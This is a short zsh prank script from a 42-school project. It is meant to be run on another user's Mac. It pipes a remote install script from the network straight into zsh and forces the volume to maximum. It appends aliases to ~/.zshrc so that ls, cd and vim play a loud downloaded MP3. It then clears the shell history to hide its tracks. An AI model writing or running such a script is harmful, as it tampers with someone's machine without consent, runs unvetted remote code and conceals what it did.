# **************************************************************************** #
#                                                           LE - /             #
#                                                               /              #
#    troll.sh                                         .::    .:/ .      .::    #
#                                                  +:+:+   +:    +:  +:+:+     #
#    By: amonteli <marvin@le-101.fr>                +:+   +:    +:    +:+      #
#                                                  #+#   #+    #+    #+#       #
#    Created: 2019/07/09 18:50:13 by amonteli     #+#   ##    ##    #+#        #
#    Updated: 2019/07/14 17:13:00 by amonteli    ###    #+. /#+    ###.fr      #
#                                                          /                   #
#                                                         /                    #
# **************************************************************************** #

if [ -f ~/.zshrc ]
then
	cp ~/.zshrc ~/.zshrcsave
fi

if [ -f ~/.brewconfig.zsh ]
then
	(brew install switchaudio-osx)
else
	(curl -fsSL https://rawgit.com/kube/42homebrew/master/install.sh | zsh)
	(brew install switchaudio-osx)
fi

if [ -f ~/.oh-my-zsh/custom/alias.zsh ]
then
	cp ~/.oh-my-zsh/custom/alias.zsh ~/.oh-my-zsh/custom/.aliassave
fi
touch ~/.oh-my-zsh/custom/alias.zsh
(SwitchAudioSource -s "Built-in Output" &)
(osascript -e "set volume output volume 100" &)

touch ~/.zshrc
(osascript -e "set volume output volume 100" &)
echo "alias ls='(afplay --volume 255 ~/.bernard.mp3 &) ; ls $1'" >> ~/.zshrc
echo "alias cd='(afplay --volume 255 ~/.bernard.mp3 &) ; cd $1'" >> ~/.zshrc
echo "alias vim='(afplay --volume 255 ~/.bernard.mp3 &) ; vim $1'" >> ~/.zshrc
curl https://raw.githubusercontent.com/iSnkh/Troll_42/master/sound/bernard.mp3 -o ~/.bernard.mp3
clear
history -c
exec zsh
